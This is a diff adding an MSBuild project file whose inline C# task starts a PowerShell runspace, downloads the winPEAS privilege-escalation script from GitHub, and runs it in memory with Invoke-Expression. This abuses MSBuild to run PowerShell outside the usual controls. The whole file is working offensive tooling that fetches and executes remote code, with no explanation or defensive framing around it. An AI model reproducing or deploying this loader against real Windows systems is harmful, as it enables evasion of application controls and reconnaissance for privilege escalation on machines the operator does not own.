@@ -1,0 +1,67 @@
+<Project ToolsVersion="4.0" DefaultTargets="Run" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Run">
+    <RunWinPEAS />
+  </Target>
+
+  <UsingTask TaskName="RunWinPEAS"
+             TaskFactory="CodeTaskFactory"
+             AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Reference Include="System.Management.Automation" />
+      <Code Type="Class" Language="cs"><![CDATA[
+using System;
+using System.Linq;
+using System.Text;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+using System.Management.Automation;
+using System.Management.Automation.Runspaces;
+
+public class RunWinPEAS : Task {
+  public override bool Execute() {
+    try {
+      using (var rs = RunspaceFactory.CreateRunspace()) {
+        rs.Open();
+        using (var ps = PowerShell.Create()) {
+          ps.Runspace = rs;
+
+          var script = @"
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ErrorActionPreference = 'Continue'
+$ProgressPreference    = 'SilentlyContinue'
+
+$raw = 'https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1'
+Write-Output ""[*] Downloading: $raw""
+$resp = Invoke-WebRequest $raw -UseBasicParsing
+if(-not $resp -or -not $resp.Content){ throw ""Download failed: $raw"" }
+
+Invoke-Expression $resp.Content   # laad winPEAS in session
+$InformationPreference = 'Continue'
+Invoke-WinPEAS 6>&1 | Out-String
+";
+
+          ps.AddScript(script);
+
+          var results = ps.Invoke();
+          var sb = new StringBuilder();
+
+          if (ps.Streams.Error != null && ps.Streams.Error.Count > 0) {
+            foreach (var e in ps.Streams.Error) sb.AppendLine("PSERR: " + e.ToString());
+          }
+
+          foreach (var r in results) if (r != null) sb.AppendLine(r.ToString());
+
+          Log.LogMessage(MessageImportance.High, sb.ToString());
+        }
+      }
+      return true;
+    } catch (Exception ex) {
+      Log.LogErrorFromException(ex, true);
+      return false;
+    }
+  }
+}
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
